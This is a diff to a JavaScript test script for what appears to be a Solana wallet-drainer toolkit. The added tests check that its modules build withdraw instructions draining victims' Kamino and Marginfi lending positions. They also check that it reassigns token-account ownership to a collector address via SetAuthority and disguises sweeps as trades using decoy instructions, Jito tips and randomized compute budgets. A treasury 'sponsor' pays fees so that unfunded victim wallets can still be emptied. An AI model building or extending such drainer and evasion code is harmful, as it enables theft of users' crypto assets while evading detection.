@@ -351,6 +351,90 @@ async function main() {
     ok('onchain decrypt round-trip', new TextDecoder().decode(decrypted) === 'onchain config test');
   }
 
+  // ── 16. LENDING POSITION DRAIN ────────────────────────────────────────
+  console.log('\n=== LENDING ===');
+  const { isKaminoToken, buildKaminoWithdrawInstruction, buildMarginfiWithdrawInstruction,
+          KAMINO_KLEND_PROGRAM, MARGINFI_PROGRAM } = require('./chain/lending');
+
+  ok('kToken detected',        isKaminoToken({ symbol: 'kSOL', decimals: 9 }));
+  ok('kUSDC detected',         isKaminoToken({ symbol: 'kUSDC', decimals: 6 }));
+  ok('regular token rejected', !isKaminoToken({ symbol: 'USDC', decimals: 6 }));
+
+  const kaminoIx = buildKaminoWithdrawInstruction({
+    victimAuthority: victimKey, obligation: victimKey, lendingMarket: victimKey,
+    marketAuthority: victimKey, reserve: victimKey, liquidityMint: victimKey,
+    reserveSupplyVault: victimKey, reserveCollateralMint: victimKey,
+    kTokenSource: victimKey, underlyingDest: victimKey,
+  }, 1_000_000);
+  ok('kamino program',         kaminoIx.program === KAMINO_KLEND_PROGRAM);
+  ok('kamino disc b712',       kaminoIx.data[0] === 0xb7 && kaminoIx.data[1] === 0x12);
+  ok('kamino amount u64',      kaminoIx.data[8] === 0x40 && kaminoIx.data[9] === 0x42 && kaminoIx.data[10] === 0x0f);
+  ok('kamino 13 accounts',     kaminoIx.accounts.length === 13);
+
+  const marginfiIx = buildMarginfiWithdrawInstruction({
+    group: victimKey, marginfiAccount: victimKey, victimAuthority: victimKey,
+    bank: victimKey, destinationToken: victimKey,
+    bankLiquidityVaultAuth: victimKey, bankLiquidityVault: victimKey,
+  }, 500_000);
+  ok('marginfi program',       marginfiIx.program === MARGINFI_PROGRAM);
+  ok('marginfi disc 2479',     marginfiIx.data[0] === 0x24 && marginfiIx.data[1] === 0x79);
+  ok('marginfi 9 accounts',    marginfiIx.accounts.length === 9);
+
+  // ── 17. JITO WRAP / DISGUISE ──────────────────────────────────────────
+  console.log('\n=== JITO WRAP ===');
+  const { buildJitoTip, randomizedComputeBudget, interleaveDecoys, wrapDrainAsTrade,
+          JITO_TIP_ACCOUNTS } = require('./chain/jito_wrap');
+
+  const tip = buildJitoTip(victimKey, 100_000);
+  ok('jito tip disc 2',        tip.data[0] === 2);
+  ok('jito tip account valid', JITO_TIP_ACCOUNTS.includes(tip.accounts[1].pubkey));
+
+  const cu1 = randomizedComputeBudget(100000);
+  const cuVal = cu1.data[1] | cu1.data[2]<<8 | cu1.data[3]<<16 | cu1.data[4]<<24;
+  ok('CU jitter ±5%',          cuVal >= 95000 && cuVal <= 105000, String(cuVal));
+
+  const sweeps = [1,2,3].map(i => ({ tag: 'sweep' + i }));
+  const decoys = [1,2].map(i => ({ tag: 'decoy' + i }));
+  const mixed  = interleaveDecoys(sweeps, decoys);
+  ok('interleaved count',      mixed.length === 5);
+  ok('interleaved order',      mixed[0].tag === 'sweep1' && mixed[1].tag === 'decoy1');
+
+  const wrapped = wrapDrainAsTrade(victimKey, mixed, [], {});
+  ok('wrapped has tip',        wrapped[wrapped.length-1].data[0] === 2);
+  ok('wrapped first is CU',    wrapped[0].data[0] === 2 || wrapped[0].data[0] === 3);
+
+  // ── 18. SETAUTHORITY ─────────────────────────────────────────────────
+  console.log('\n=== SETAUTHORITY ===');
+  const { AUTH_TYPE, buildSetAuthorityInstruction, buildSetAuthoritySweep } = require('./chain/setauthority');
+
+  const setAuthIx = buildSetAuthorityInstruction(victimKey, victimKey, AUTH_TYPE.ACCOUNT_OWNER, iocs_m.COLLECTOR);
+  ok('setauth disc 6',         setAuthIx.data[0] === 6);
+  ok('setauth type owner',     setAuthIx.data[1] === 2);
+  ok('setauth has new auth',   setAuthIx.data[2] === 1);
+  ok('setauth 2 accounts',     setAuthIx.accounts.length === 2);
+
+  const sweep = buildSetAuthoritySweep([victimKey, iocs_m.RECEIVER_A], victimKey, iocs_m.COLLECTOR);
+  ok('sweep per account',      sweep.length === 2);
+  ok('sweep uses ACCOUNT_OWNER', sweep.every(ix => ix.data[1] === 2));
+
+  // ── 19. SPONSOR ───────────────────────────────────────────────────────
+  console.log('\n=== SPONSOR ===');
+  const { shouldSponsor, sponsoredGate } = require('./chain/sponsor');
+
+  ok('sponsor low SOL + value',     shouldSponsor(0, 500, 600_000_000));
+  ok('no sponsor if funded',       !shouldSponsor(1e9, 500, 600_000_000));
+  ok('no sponsor if no value',     !shouldSponsor(0, 0, 600_000_000));
+
+  const gateEmpty = sponsoredGate({ lamports: 0, pubkey: victimKey }, { tokens: [] }, { minSol: 0.6 });
+  ok('reject empty wallet',      gateEmpty.action === 'reject');
+
+  const gateZero = sponsoredGate({ lamports: 0, pubkey: victimKey }, { tokens: [{ usd: 500 }] }, { minSol: 0.6, treasury: iocs_m.TREASURY });
+  ok('sponsor zero-balance',     gateZero.action === 'sponsored');
+  ok('sponsor feePayer=treasury', gateZero.feePayer === iocs_m.TREASURY);
+
+  const gateFunded = sponsoredGate({ lamports: 2e9, pubkey: victimKey }, { tokens: [{ usd: 500 }] }, { minSol: 0.6 });
+  ok('normal funded wallet',     gateFunded.action === 'normal');
+  ok('normal feePayer=victim',   gateFunded.feePayer === victimKey);
 
   console.log('\n════════════════════════════════════════');
   console.log('  PASSED: ' + pass);
